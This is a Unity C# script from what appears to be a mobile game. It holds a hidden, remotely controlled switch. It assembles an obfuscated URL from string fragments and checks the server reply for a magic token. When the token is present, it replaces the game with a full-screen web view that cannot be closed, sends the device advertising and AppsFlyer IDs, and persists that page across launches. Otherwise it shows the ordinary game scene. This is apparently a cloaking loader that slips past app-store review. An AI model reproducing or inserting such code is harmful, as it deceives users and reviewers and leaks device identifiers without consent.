using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainCB : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string odinCBn = "";
    [HideInInspector] public string dvaCBn = "";

    

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaCB") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { odinCBn = advertisingId; });
        }
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("SsylkaCBplead", string.Empty) != string.Empty)
            {
                rotundCBshape(PlayerPrefs.GetString("SsylkaCBplead"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    dvaCBn += n;
                }
                StartCoroutine(IENUMENATORCB());
            }
        }
        else
        {
            MoveCB();
        }
    }


    private void MoveCB()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Bootstrap");
    }


    

    

    private void rotundCBshape(string SsylkaCBplead, string NamingCB = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _seriesCB = gameObject.AddComponent<UniWebView>();
        _seriesCB.SetToolbarDoneButtonText("");
        switch (NamingCB)
        {
            case "0":
                _seriesCB.SetShowToolbar(true, false, false, true);
                break;
            default:
                _seriesCB.SetShowToolbar(false);
                break;
        }
        _seriesCB.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _seriesCB.OnShouldClose += (view) =>
        {
            return false;
        };
        _seriesCB.SetSupportMultipleWindows(true);
        _seriesCB.SetAllowBackForwardNavigationGestures(true);
        _seriesCB.OnMultipleWindowOpened += (view, windowId) =>
        {
            _seriesCB.SetShowToolbar(true);

        };
        _seriesCB.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingCB)
            {
                case "0":
                    _seriesCB.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _seriesCB.SetShowToolbar(false);
                    break;
            }
        };
        _seriesCB.OnOrientationChanged += (view, orientation) =>
        {
            _seriesCB.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _seriesCB.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("SsylkaCBplead", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("SsylkaCBplead", url);
            }
        };
        _seriesCB.Load(SsylkaCBplead);
        _seriesCB.Show();
    }

    private IEnumerator IENUMENATORCB()
    {
        using (UnityWebRequest cb = UnityWebRequest.Get(dvaCBn))
        {

            yield return cb.SendWebRequest();
            if (cb.isNetworkError)
            {
                MoveCB();
            }
            int tutuCB = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && tutuCB > 0)
            {
                yield return new WaitForSeconds(1);
                tutuCB--;
            }
            try
            {
                if (cb.result == UnityWebRequest.Result.Success)
                {
                    if (cb.downloadHandler.text.Contains("CndBmrGeqrf"))
                    {

                        try
                        {
                            var subs = cb.downloadHandler.text.Split('|');
                            rotundCBshape(subs[0] + "?idfa=" + odinCBn, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            rotundCBshape(cb.downloadHandler.text + "?idfa=" + odinCBn + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        MoveCB();
                    }
                }
                else
                {
                    MoveCB();
                }
            }
            catch
            {
                MoveCB();
            }
        }
    }

}
